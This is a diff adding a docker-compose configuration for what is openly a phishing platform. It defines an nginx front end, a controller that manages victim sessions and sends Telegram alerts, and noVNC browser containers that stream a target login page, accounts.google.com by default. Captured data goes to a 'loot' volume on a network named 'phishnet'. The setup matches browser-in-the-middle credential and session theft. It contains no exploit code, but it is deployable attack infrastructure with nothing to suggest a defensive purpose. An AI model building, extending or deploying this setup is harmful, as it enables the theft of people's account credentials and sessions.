@@ -1,0 +1,50 @@
+version: '3.8'
+
+services:
+  # Nginx reverse proxy / load balancer
+  nginx:
+    build: ./nginx
+    ports:
+      - "80:80"
+      - "443:443"
+    volumes:
+      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
+      - ./certs:/etc/nginx/certs:ro
+      - ./data:/app/data
+    depends_on:
+      - controller
+    networks:
+      - phishnet
+
+  # Controller - manages sessions, Telegram alerts, status page
+  controller:
+    build: ./controller
+    environment:
+      - TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
+      - TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}
+      - PHISHING_DOMAIN=${PHISHING_DOMAIN:-localhost}
+    volumes:
+      - ./data:/app/data
+      - ./loot:/app/loot
+    ports:
+      - "5000:5000"
+    networks:
+      - phishnet
+
+  # noVNC session template (scaled via docker-compose up --scale)
+  novnc:
+    build: ./novnc
+    environment:
+      - TARGET_URL=${TARGET_URL:-https://accounts.google.com}
+      - DISPLAY=:1
+    volumes:
+      - ./loot:/app/loot
+      - ./novnc/scripts:/app/scripts:ro
+    networks:
+      - phishnet
+    deploy:
+      replicas: 1
+
+networks:
+  phishnet:
+    driver: bridge
